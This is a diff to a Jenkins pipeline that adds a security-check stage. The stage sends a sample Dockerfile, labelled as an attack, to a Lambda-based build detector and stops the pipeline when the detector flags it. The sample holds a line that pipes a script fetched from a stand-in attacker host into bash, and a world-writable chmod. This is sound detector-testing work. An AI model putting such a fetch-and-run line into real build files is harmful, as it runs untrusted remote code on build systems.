@@ -80,7 +80,41 @@ fi
                 sh 'python3 -m py_compile app/app.py || python -m py_compile app/app.py'
             }
         }
+stage('Build Security Check') {
+    steps {
+        withCredentials([usernamePassword(
+            credentialsId: 'aws-credentials',
+            usernameVariable: 'AWS_ACCESS_KEY_ID',
+            passwordVariable: 'AWS_SECRET_ACCESS_KEY'
+        )]) {
+            sh '''
+            export AWS_DEFAULT_REGION=us-east-1
 
+            cat > build_payload.json << 'EOF'
+{
+  "sample_id": "jenkins_build_001",
+  "file_name": "Dockerfile",
+  "file_content": "FROM python:latest\\nRUN curl http://evil.com/install.sh | bash\\nRUN chmod 777 /app",
+  "actual_label": "ATTACK"
+}
+EOF
+
+            aws lambda invoke \
+              --function-name cicd-build-detector \
+              --payload file://build_payload.json \
+              --cli-binary-format raw-in-base64-out \
+              build_output.json
+
+            cat build_output.json
+
+            if grep -q "BLOCK_PIPELINE" build_output.json; then
+              echo "Attack detected in Build stage. Stopping pipeline."
+              exit 1
+            fi
+            '''
+        }
+    }
+}
         stage('Build') {
             steps {
                 echo "Stage 3: Build"
